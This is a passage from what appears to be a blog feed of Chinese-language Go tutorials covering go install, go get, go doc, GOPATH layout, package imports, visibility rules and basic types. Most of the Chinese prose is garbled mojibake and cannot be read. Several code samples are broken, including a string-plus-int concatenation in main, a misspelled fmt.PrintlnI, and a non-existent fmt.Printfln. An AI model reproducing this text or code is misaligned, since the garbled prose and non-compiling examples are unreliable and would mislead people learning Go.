installå¯ä»¥åšä¸¤ä»¶äº‹æƒ…ï¼š</p><ul><li>å°†åŒ…ç¼–è¯‘æˆ.aä¸­é—´ç¼“å­˜å¯¹è±¡ï¼Œå¦‚æœæºç å°šæœªæ›´æ”¹ï¼Œå°†åœ¨ä¸‹ä¸€æ¬¡ç¼–è¯‘æœŸé—´ä½¿ç”¨ç¼“å­˜ã€‚</li><li>å¦‚æœæ˜¯ main åŒ…ï¼Œå¹¶å°†å…¶ç¼–è¯‘æˆå¯æ‰§è¡Œæ–‡ä»¶</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">â”œâ”€â”€ bin</span><br><span class="line">â”‚   â””â”€â”€ hello  # by go install</span><br><span class="line">â””â”€â”€ src</span><br><span class="line">    â””â”€â”€ hello</span><br><span class="line">        â”œâ”€â”€ hello  # by go build</span><br><span class="line">        â””â”€â”€ hello.go</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼š</p><ul><li>go install å¦‚æœè¦åœ¨é GOPATH è·¯å¾„ä¸‹ä½¿ç”¨çš„è¯ï¼Œè¦å…ˆè®¾å®š GOBINç¯å¢ƒå˜é‡ï¼Œå¦åˆ™ä¼šå‡ºç°é”™è¯¯</li><li>é€šå¸¸ GOBIN ç¯å¢ƒå˜é‡å°±æ˜¯è®¾å®š GOPATH/binã€‚</li></ul><h3 id="go-getdeprecated-in-go1.16">go get(deprecated in go1.16)</h3><p>GOPATH å¾ˆå¤§çš„ç¼ºç‚¹ï¼Œå°±æ˜¯ç›¸å…³ç¬¬ä¸‰æ–¹åŒ…åªè¦ä¸æ˜¯å®˜æ–¹åº“ï¼Œéƒ½éœ€è¦æ”¾ç½®åœ¨GOPATH/src çš„è·¯å¾„ä¸‹æ‰å¯ä½¿ç”¨ã€‚é€šå¸¸æˆ‘ä»¬ä¼šä½¿ç”¨ go getæŒ‡ä»¤æ¥è·å–ç½‘ç»œä¸Šçš„ç¬¬ä¸‰æ–¹åŒ…ï¼Œå¹¶å®‰è£…åˆ°æœ¬åœ°ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go get github.com/gin-gonic/gin</span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬ä» Github ä¸Šä¸‹è½½ç¬¬ä¸‰æ–¹åŒ…å¤šäº†ä¹‹åï¼Œä¼šå‘ç° GOPATH/srcä¸‹çš„ä»£ç ä¼šå¾ˆå¤æ‚ï¼Œé™¤äº†æœ‰ä½ è‡ªå·±å¼€å‘çš„é¡¹ç›®æ–‡ä»¶å¤¹ï¼Œä¹ŸåŒ…å«å…¶ä»–ç¬¬ä¸‰æ–¹åº“çš„é¡¹ç›®æ–‡ä»¶å¤¹ã€‚</p><p>æ­¤å¤–ï¼Œå¦‚æœä½ å¼€å‘çš„é¡¹ç›®é‡‡ç”¨ç¬¬ä¸‰æ–¹å¥—ä»¶æ˜¯ä¸åŒç‰ˆæœ¬ä¹Ÿå¾ˆæ£˜æ‰‹ã€‚ä»¥å¾€çš„è§£å†³æ–¹æ³•æ˜¯è¦è®¾å®šå¤šç»„ä¸åŒçš„GOPATHã€‚ è™½ç„¶ç¤¾ç¾¤ä¹Ÿæœ‰å¼€å‘ç›¸å¯¹åº”çš„ package managerï¼Œå¦‚ Vendorã€Depæ¥è§£å†³è¯¥é—®é¢˜ï¼Œä½†æ¯•ç«Ÿä¸æ˜¯å®˜æ–¹ä¸»å¯¼çš„ã€‚å› æ­¤ï¼Œ<strong>æœ‰äº† Go Modulesçš„è¯ç”Ÿ</strong>ï¼Œæˆ‘ä»¬ä¸‹ä¸€ç¯‡æ–‡ç« å†è®²ã€‚</p><p>ä½†æ˜¯ä» Go 1.16 å¼€å§‹é€æ¸åºŸå¼ƒ go get å®‰è£…åŒ…çš„åŠŸèƒ½ï¼Œè¯¦ç»†è§<ahref="https://go.dev/blog/go116-module-changes">New module changes in Go1.16 - go.dev</a>ï¼Œ<strong>å®˜æ–¹æ¨èä½¿ç”¨ go install å¸¦ç‰ˆæœ¬å®‰è£…</strong>,ä½¿ç”¨ç¤ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">go install golang.org/x/tools/gopls@latest</span><br><span class="line">go install golang.org/x/tools/gopls@v0.6.5</span><br></pre></td></tr></table></figure><h2 id="go-doc">go doc</h2><p>å¯ä»¥ä½¿ç”¨ go doc[åŒ…][.å‡½æ•°å]æŸ¥çœ‹åŒ…æˆ–å‡½æ•°çš„è¯¦ç»†æºç ï¼Œç»å¸¸æŸ¥çœ‹æºç æ–¹ä¾¿ç†è§£ Go å‡½æ•°çš„åŸç†ä¾‹å¦‚ï¼š<code>go doc fmt</code>ã€<code>go doc fmt.Printfln</code></p><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><blockquote><ol type="1"><li><ahref="https://pkg.go.dev/cmd/go#hdr-GOPATH_environment_variable">gocmd/go pkg.go.dev</a></li><li><ahref="https://stackoverflow.com/questions/7970390/what-should-be-the-values-of-gopath-and-goroot">go- What should be the values of GOPATH and GOROOT? - StackOverflow</a></li><li><ahref="https://medium.com/%E4%BC%81%E9%B5%9D%E4%B9%9F%E6%87%82%E7%A8%8B%E5%BC%8F%E8%A8%AD%E8%A8%88/golang-goroot-gopath-go-modules-%E4%B8%89%E8%80%85%E7%9A%84%E9%97%9C%E4%BF%82%E4%BB%8B%E7%B4%B9-d17481d7a655">Golangâ€” GOROOTã€GOPATHã€Go-Modules-ä¸‰è€…çš„é—œä¿‚ä»‹ç´¹ | by é™³å† å„„ Kenny |ä¼éµä¹Ÿæ‡‚ç¨‹å¼è¨­è¨ˆ | Medium</a></li><li><ahref="https://stackoverflow.com/questions/7970390/what-should-be-the-values-of-gopath-and-goroot">go- What should be the values of GOPATH and GOROOT? - StackOverflow</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vscode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang ç®€ä»‹ä¸å…¥é—¨</title>
      <link href="/blog/2022/10/16/programming/go/go_intro/"/>
      <url>/blog/2022/10/16/programming/go/go_intro/</url>
      
        <content type="html"><![CDATA[<h2 id="go-courses">Go courses</h2><ol type="1"><li><a href="https://github.com/Unknwon/go-fundamental-programming">GoåŸºç¡€æ•™ç¨‹</a></li><li><a href="https://golangr.com/exercises/">Go Exercises | Learn GoProgramming</a></li><li><a href="https://exercism.org/my/tracks/go">Exercism</a></li><li><a href="https://courses.calhoun.io/courses">Courses Dashboard |courses.calhoun.io</a></li></ol><h2 id="ä»€ä¹ˆæ˜¯-go">1. ä»€ä¹ˆæ˜¯ Goï¼Ÿ</h2><p>Go æ˜¯ä¸€é—¨ <strong>å¹¶å‘æ”¯æŒ ã€åƒåœ¾å›æ”¶ çš„ ç¼–è¯‘å‹ç³»ç»Ÿç¼–ç¨‹è¯­è¨€</strong>ï¼Œæ—¨åœ¨åˆ›é€ ä¸€é—¨å…·æœ‰åœ¨é™æ€ç¼–è¯‘è¯­è¨€çš„<strong>é«˜æ€§èƒ½</strong>å’ŒåŠ¨æ€è¯­è¨€çš„<strong>é«˜æ•ˆå¼€å‘</strong>ä¹‹é—´æ‹¥æœ‰è‰¯å¥½å¹³è¡¡ç‚¹çš„ä¸€é—¨ç¼–ç¨‹è¯­è¨€ã€‚</p><p>Go çš„ä¸»è¦ç‰¹ç‚¹æœ‰å“ªäº›ï¼Ÿ</p><ul><li><strong>ç±»å‹å®‰å…¨</strong>å’Œ<strong>å†…å­˜å®‰å…¨</strong></li><li>ä»¥éå¸¸<strong>ç›´è§‚</strong>å’Œ<strong>æä½ä»£ä»·</strong>çš„æ–¹æ¡ˆå®ç°é«˜å¹¶å‘</li><li><strong>é«˜æ•ˆ</strong>çš„åƒåœ¾å›æ”¶æœºåˆ¶</li><li><strong>å¿«é€Ÿç¼–è¯‘</strong>ï¼ˆåŒæ—¶è§£å†³ C è¯­è¨€ä¸­å¤´æ–‡ä»¶å¤ªå¤šçš„é—®é¢˜ï¼‰</li><li>ä¸ºå¤šæ ¸è®¡ç®—æœºæä¾›æ€§èƒ½æå‡çš„æ–¹æ¡ˆ</li><li><strong>UTF-8</strong> ç¼–ç æ”¯æŒ</li></ul><p>Go ç¯å¢ƒå˜é‡ä¸å·¥ä½œç›®å½•</p><p>æ ¹æ®çº¦å®šï¼ŒGOPATH ä¸‹éœ€è¦å»ºç«‹ 3 ä¸ªç›®å½•:</p><ul><li>binï¼ˆå­˜æ”¾ç¼–è¯‘åç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼‰</li><li>pkgï¼ˆå­˜æ”¾ç¼–è¯‘åç”Ÿæˆçš„åŒ…æ–‡ä»¶ï¼‰</li><li>srcï¼ˆå­˜æ”¾é¡¹ç›®æºç ï¼‰</li></ul><p>Go å¸¸ç”¨å‘½ä»¤ç®€ä»‹</p><ul><li>go getï¼šè·å–è¿œç¨‹åŒ…ï¼ˆéœ€æå‰å®‰è£… git æˆ– hgï¼‰</li><li>go runï¼šç›´æ¥è¿è¡Œç¨‹åºï¼ˆç›´æ¥ç¼–è¯‘ç”Ÿæˆä¸´æ—¶æ–‡ä»¶ï¼Œç›´æ¥å¼€å§‹è¿è¡Œï¼‰</li><li>go buildï¼šæµ‹è¯•ç¼–è¯‘ï¼Œæ£€æŸ¥æ˜¯å¦æœ‰ç¼–è¯‘é”™è¯¯ï¼ˆ package åç§°ä¸ºï¼šmainçš„æ‰å¯ä»¥ä½¿ç”¨å®ƒï¼Œç„¶åç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ï¼‰</li><li>go fmtï¼šæ ¼å¼åŒ–æºç ï¼ˆéƒ¨åˆ† IDE åœ¨ä¿å­˜æ—¶è‡ªåŠ¨è°ƒç”¨ï¼‰</li><li>go installï¼šç¼–è¯‘åŒ…æ–‡ä»¶å¹¶ç¼–è¯‘æ•´ä¸ªç¨‹åº(ç¼–è¯‘åŒ…æ–‡ä»¶ -&gt;ç”Ÿæˆâ€œæ“ä½œç³»ç»Ÿå_cpu å‹å·â€ çš„æ–‡ä»¶å¤¹ -&gt; åœ¨è¯¥æ–‡ä»¶å¤¹ä¸‹çš„ binæ–‡ä»¶å¤¹é‡Œç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ -&gt; å½“ä½ è¦è¿è¡Œæ—¶ï¼Œéœ€è¦æŠŠå¯æ‰§è¡Œæ–‡ä»¶æ‹·åˆ° binæ–‡ä»¶å¤¹åŒçº§åˆ«ï¼Œ å› ä¸ºæ˜¯ç›¸å¯¹è·¯å¾„)</li><li>go testï¼šè¿è¡Œæµ‹è¯•æ–‡ä»¶(ä»¥ â€œ*_test.goâ€ ç»“å°¾çš„æ–‡ä»¶)</li><li>go docï¼šæŸ¥çœ‹æ–‡æ¡£</li></ul><h2 id="ç®€å•ä¾‹å­">1.1. ç®€å•ä¾‹å­</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;Hello World&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>go build ä¼šç¼–è¯‘åä¸º main çš„ packageåŒ…ï¼Œç„¶åæˆ‘ä»¬å¯¼å…¥ç®¡ç†æ ¼å¼åŒ–è¾“å…¥è¾“å‡ºçš„ fmt åŒ…ã€‚ func main(){} æ˜¯å‡½æ•°ï¼Œè€Œä¸”main å‡½æ•°æ²¡æœ‰å‚æ•°ä»¥åŠè¿”å›å€¼ï¼Œ å·¦è¾¹ <code>&#123;</code> éœ€è¦å’Œ main()åŒè¡Œï¼Œå› ä¸º go è™½ç„¶ä¸æƒ³ c è¯­è¨€æ˜¾å¼è¦æ±‚ä»¥åˆ†å·ç»“å°¾ï¼Œä½†æ˜¯ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨åŠ ä¸Šï¼Œå¦‚æœæŠŠ å·¦ <code>&#123;</code> ä¸‹è½½ä¸‹ä¸€è¡Œï¼Œé‚£ä¹ˆå°±ä¼šæŠ¥é”™ã€‚</p><h2 id="æ ¼å¼åŒ–è¾“å…¥">1.2. æ ¼å¼åŒ–è¾“å…¥</h2><p>fmt.Print vs fmt.Println vs fmt.Printf</p><p><code>fmt.Print</code> and <code>fmt.Println</code> print the rawstring (<code>fmt.Println</code> appends a newline)</p><p><code>fmt.Printf</code> will not print a new line, you will have toadd that to the end yourself with <code>\n</code>.</p><p>The way <code>fmt.Printf</code> works is simple, you supply a stringthat contains certain symbols, and the other arguments replace thosesymbols. For example:</p><p>å‚è€ƒï¼š<ahref="https://stackoverflow.com/questions/53879154/println-vs-printf-vs-print-in-go">Printlnvs Printf vs Print in Go - Stack Overflow</a></p><h1 id="go-ç¨‹åºç»“æ„">2. Go ç¨‹åºç»“æ„</h1><h2 id="åŸºæœ¬ç»“æ„">2.1. åŸºæœ¬ç»“æ„</h2><ul><li>Go ç¨‹åºæ˜¯é€šè¿‡ package æ¥ç»„ç»‡çš„</li><li>åªæœ‰ package åç§°ä¸º<code>main</code> çš„åŒ…å¯ä»¥åŒ…å« main å‡½æ•°</li><li>ä¸€ä¸ªå¯æ‰§è¡Œç¨‹åº <strong>æœ‰ä¸”ä»…æœ‰</strong> ä¸€ä¸ª main åŒ…</li></ul><h2 id="å…³é”®å­—æ ‡è¯†ç¬¦">2.2. å…³é”®å­—æ ‡è¯†ç¬¦</h2><ul><li>é€šè¿‡ <code>import</code> å…³é”®å­—æ¥å¯¼å…¥å…¶å®ƒé main åŒ…</li><li>é€šè¿‡<code>const</code> å…³é”®å­—æ¥è¿›è¡Œå¸¸é‡çš„å®šä¹‰</li><li>é€šè¿‡åœ¨å‡½æ•°ä½“å¤–éƒ¨ä½¿ç”¨ var å…³é”®å­—æ¥è¿›è¡Œå…¨å±€å˜é‡çš„å£°æ˜ä¸èµ‹å€¼</li><li>é€šè¿‡ <code>type</code>å…³é”®å­—æ¥è¿›è¡Œç»“æ„(<code>struct</code>)æˆ–æ¥å£(<code>interface</code>)çš„å£°æ˜</li><li>é€šè¿‡<code>func</code> å…³é”®å­—æ¥è¿›è¡Œå‡½æ•°çš„å£°æ˜ Go å¯¼å…¥ packageçš„æ ¼å¼:</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>(</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;math&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>å¯¼å…¥åŒ…ä¹‹åï¼Œå°±å¯ä»¥ä½¿ç”¨æ ¼å¼ <PackageName>.<FuncName>æ¥å¯¹åŒ…ä¸­çš„å‡½æ•°è¿›è¡Œè°ƒç”¨ å¦‚æœå¯¼å…¥åŒ…ä¹‹å æœªè°ƒç”¨å…¶ä¸­çš„å‡½æ•°æˆ–è€…ç±»å‹å°†ä¼šæŠ¥å‡ºç¼–è¯‘é”™è¯¯ï¼šimported and not used</p><h2 id="package-åˆ«å">2.3. Package åˆ«å</h2><p>å½“ä½¿ç”¨ç¬¬ä¸‰æ–¹åŒ…æ—¶ï¼ŒåŒ…åå¯èƒ½ä¼šéå¸¸æ¥è¿‘æˆ–è€…ç›¸åŒï¼Œæ­¤æ—¶å°±å¯ä»¥ä½¿ç”¨åˆ«åæ¥è¿›è¡ŒåŒºåˆ«å’Œè°ƒç”¨ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">import</span>(</span><br><span class="line">    io <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line">...</span><br><span class="line">io.Println(<span class="string">&quot;Hello World&quot;</span>)</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="çœç•¥è°ƒç”¨">2.3.1. çœç•¥è°ƒç”¨</h3><p>ç›¸å½“äºæŠŠåŒ…åˆ«åå®šä¹‰æˆ <code>.</code>å½“å‰ç›®å½•ï¼Œç„¶åå°±å¯ä»¥ç›´æ¥ä½¿ç”¨åŒ…ä¸­çš„å‡½æ•°äº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import(</span><br><span class="line">    . &quot;fmt&quot;</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>ä¸å»ºè®®ä½¿ç”¨ï¼Œæ˜“æ··æ·†</li><li>ä¸å¯ä»¥å’Œåˆ«ååŒæ—¶ä½¿ç”¨</li></ul><h2 id="å¯è§æ€§è§„åˆ™">2.4. å¯è§æ€§è§„åˆ™</h2><p>Go è¯­è¨€ä¸­ï¼Œä½¿ç”¨ å¤§å°å†™ æ¥å†³å®šè¯¥ å¸¸é‡ã€å˜é‡ã€ç±»å‹ã€æ¥å£ã€ç»“æ„ æˆ–å‡½æ•°æ˜¯å¦å¯ä»¥è¢«å¤–éƒ¨åŒ…æ‰€è°ƒç”¨ï¼š</p><p>æ ¹æ®çº¦å®šï¼Œå‡½æ•°åé¦–å­—æ¯<strong>å°å†™</strong>å³ä¸ºprivateï¼Œå‡½æ•°åé¦–å­—æ¯<strong>å¤§å†™</strong>å³ä¸º public.è¿™æ ·ï¼Œå½“ä½ è°ƒç”¨å…¶ä»–åŒ…çš„å‡½æ•°æ—¶ï¼Œå‡½æ•°å¼€å¤´ä¸€å®šä¸ºå¤§å†™ï¼Œå¦åˆ™å°±å†™é”™äº†ã€‚</p><p>ç®€å• go ç¨‹åºï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å½“å‰ç¨‹åºåŒ…åï¼Œ package main éœ€è¦ä¸‹è½½éæ³¨é‡Šçš„ç¬¬ä¸€è¡Œ</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¯¼å…¥å…¶ä»–åŒ…å</span></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;math/rand&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¸¸é‡çš„å®šä¹‰</span></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">PI     = <span class="number">3.14</span></span><br><span class="line">const1 = <span class="number">1</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//å…¨å±€å˜é‡çš„å£°æ˜ä¸èµ‹å€¼</span></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">name = <span class="string">&quot;gopher&quot;</span></span><br><span class="line">id   = <span class="number">3</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸€èˆ¬ç±»å‹å£°æ˜</span></span><br><span class="line"><span class="keyword">type</span> (</span><br><span class="line">newType <span class="type">int</span></span><br><span class="line">type1   <span class="type">float32</span></span><br><span class="line">type2   <span class="type">string</span></span><br><span class="line">type3   <span class="type">byte</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//ç»“æ„å£°æ˜</span></span><br><span class="line"><span class="keyword">type</span> gopher <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ¥å£å£°æ˜</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> golang <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ç”± main å‡½æ•°ä½œä¸ºç¨‹åºå…¥å£ç‚¹å¯åŠ¨</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Hello World&quot;</span> + rand.Intn(<span class="number">19</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¼å…¥å¤šä¸ªåŒ…æ—¶å¯ä»¥è¿›è¡Œç®€å†™ï¼Œå£°æ˜å¤šå¸¸é‡ã€å…¨å±€å˜é‡æˆ–ä¸€èˆ¬ç±»å‹ï¼ˆéæ¥å£ã€éç»“æ„ï¼‰ä¹Ÿå¯ä»¥ç”¨åŒæ ·çš„æ–¹æ³•ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸º"å¸¸é‡ç»„ï¼Œ å…¨å±€å˜é‡ç»„ï¼Œä¸€èˆ¬ç±»å‹ç»„" æ³¨æ„ï¼š<code>var</code>å£°æ˜å…¨å±€å˜é‡çš„æ–¹æ³•ï¼Œä¸é€‚åˆåœ¨å‡½æ•°ä¸­å£°æ˜å˜é‡ä½¿ç”¨ï¼Œåªé€‚åˆå…¨å±€å˜é‡</p><h1 id="go-åŸºæœ¬ç±»å‹">3. Go åŸºæœ¬ç±»å‹</h1><h2 id="ç±»å‹">ç±»å‹</h2><ol type="1"><li><p>å¸ƒå°”å‹ å¸ƒå°”å‹ <code>bool</code> - é•¿åº¦ï¼š1 å­—èŠ‚ -å–å€¼èŒƒå›´ï¼štrueã€‚false - æ³¨æ„äº‹é¡¹ï¼šä¸å¯ä»¥ç”¨æ•°å­—ä»£æ›¿ true æˆ–falseï¼Œä¹Ÿä¸èƒ½å’Œæ•´å½¢è¿›è¡Œå¼ºåˆ¶ç±»å‹è½¬æ¢ï¼ŒäºŒè€…æ˜¯ä¸å…¼å®¹çš„ç±»å‹ 2.æ•´å½¢<code>int/uint</code> - æ ¹æ®è¿è¡Œå¹³å°å¯èƒ½ä¸º 32 æˆ– 64 ä½</p><pre><code>8 ä½æ•´å‹ï¼š`int8/uint8`- é•¿åº¦ï¼š1å­—èŠ‚- å–å€¼èŒƒå›´ï¼š-128~127/0~255å­—èŠ‚å‹ï¼š`byte`(`uint8` çš„åˆ«å`)    ä¸ºä»€ä¹ˆè¦æœ‰åˆ«åçš„ï¼Ÿä¸ºäº†æ›´å¥½åœ°åŒºåˆ†åº”ç”¨åœºæ™¯ï¼Œå¢å¼ºä»£ç å¯è¯»æ€§ã€‚    æ¯”å¦‚ï¼šè¿™é‡Œå½“ä½ æƒ³è¦è¿›è¡Œå­—èŠ‚ç›¸å…³çš„æ“ä½œæ—¶ï¼Œ æ˜¾ç„¶ç”¨ byte æ›´åŠ å…·ä½“ï¼Œå¯è¯»ã€‚16ä½æ•´å‹ï¼š`int16/uint16`    - é•¿åº¦ï¼š2å­—èŠ‚    - å–å€¼èŒƒå›´ï¼š-32768~32767/0~6553532ä½æ•´å‹ï¼š`int32ï¼ˆruneï¼‰/uint32`    - é•¿åº¦ï¼š4å­—èŠ‚    - å–å€¼èŒƒå›´ï¼š-2^32/2~2^32/2-1/0~2^32-1    - rune å½“åœºæ™¯ä¸ unicode æœ‰å…³æ—¶ã€‚64ä½æ•´å‹ï¼š`int64/uint64`    - é•¿åº¦ï¼š8å­—èŠ‚    - å–å€¼èŒƒå›´ï¼š-2^64/2~2^64/2-1/0~2^64-1</code></pre></li><li><p>æµ®ç‚¹å‹ï¼š<code>float32/float64</code></p><ul><li>é•¿åº¦ï¼š4/8 å­—èŠ‚</li><li>å°æ•°ä½ï¼šç²¾ç¡®åˆ° 7/15 å°æ•°ä½</li></ul></li><li><p>å¤æ•°ï¼š<code>complex64/complex128</code></p><ul><li>é•¿åº¦ï¼š8/16 å­—èŠ‚ è¶³å¤Ÿä¿å­˜æŒ‡é’ˆçš„ 32 ä½æˆ– 64 ä½æ•´æ•°å‹ï¼šuintptr</li></ul></li><li><p>å…¶å®ƒå€¼ç±»å‹ï¼š</p><ul><li><code>arrayã€structã€string</code></li></ul></li><li><p>å¼•ç”¨ç±»å‹ï¼š</p><ul><li><code>sliceã€mapã€chan</code> slice åˆ‡ç‰‡ï¼Œ map ç±»ä¼¼ hash tableï¼Œchan é€šé“ï¼Œå¤„ç†é«˜å¹¶å‘é€šä¿¡</li></ul></li><li><p>æ¥å£ç±»å‹ï¼š<code>inteface</code></p></li><li><p>å‡½æ•°ç±»å‹ï¼š<code>func</code></p></li><li><p>æŒ‡é’ˆ Go è™½ç„¶ä¿ç•™äº†æŒ‡é’ˆï¼Œä½†ä¸å…¶å®ƒç¼–ç¨‹è¯­è¨€ä¸åŒçš„æ˜¯ï¼Œåœ¨** Goå½“ä¸­ä¸æ”¯æŒæŒ‡é’ˆè¿ç®—ä»¥åŠ â€-&gt;â€ è¿ç®—ç¬¦ï¼Œè€Œç›´æ¥é‡‡ç”¨ â€.â€é€‰æ‹©ç¬¦æ¥æ“ä½œæŒ‡é’ˆç›®æ ‡å¯¹è±¡çš„æˆå‘˜**</p></li></ol><p>æ“ä½œç¬¦ â€&amp;â€ å–å˜é‡åœ°å€ï¼Œä½¿ç”¨ â€*â€ é€šè¿‡æŒ‡é’ˆé—´æ¥è®¿é—®ç›®æ ‡å¯¹è±¡ é»˜è®¤å€¼ä¸ºnil è€Œé NULL</p><p>é€’å¢é€’å‡è¯­å¥ åœ¨ Go å½“ä¸­ï¼Œ++ ä¸ -- æ˜¯ä½œä¸ºè¯­å¥è€Œå¹¶ä¸æ˜¯ä½œä¸ºè¡¨è¾¾å¼ï¼Œå› æ­¤ï¼Œéœ€è¦å°† <code>a++</code>, <code>a--</code>å½“ä½œå•ç‹¬çš„è¯­å¥æ¥å†™ï¼Œè€Œä¸èƒ½æ”¾åœ¨ç­‰å·å³è¾¹ï¼Œå½“ä½œå³å€¼ã€‚ å®šä¹‰ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a := <span class="number">1</span></span><br><span class="line"><span class="keyword">var</span> p *<span class="type">int</span> = &amp;a</span><br><span class="line">fmt.PrintlnI(*p)</span><br></pre></td></tr></table></figure><p>è¡¥å……ï¼š <code>math</code> åŒ…ä¸­æœ‰ Max å’Œ Minå¼€å¤´çš„æ ‡è¯†ç±»å‹æœ€å¤§æœ€å°çš„å€¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import (</span><br><span class="line">&quot;math&quot;</span><br><span class="line">)</span><br><span class="line">....</span><br><span class="line">fmt.Println(math.MaxUint32)</span><br><span class="line"></span><br><span class="line">OUTPUT:</span><br><span class="line">4294967295</span><br></pre></td></tr></table></figure><h2 id="ç±»å‹é›¶å€¼">ç±»å‹é›¶å€¼</h2><p>é›¶å€¼å¹¶ä¸ç­‰äºç©ºå€¼ï¼Œè€Œæ˜¯å½“å˜é‡è¢«å£°æ˜ä¸ºæŸç§ç±»å‹åçš„é»˜è®¤å€¼ï¼Œé€šå¸¸æƒ…å†µä¸‹å€¼ç±»å‹çš„é»˜è®¤å€¼ä¸º 0ï¼Œbool ä¸º falseï¼Œstring ä¸ºç©ºå­—ç¬¦ä¸²</p><p>ç±»å‹åˆ«å</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> (</span><br><span class="line">æ–‡æœ¬ <span class="type">string</span></span><br><span class="line"> )</span><br><span class="line">..</span><br><span class="line"><span class="keyword">var</span> chinese æ–‡æœ¬ = <span 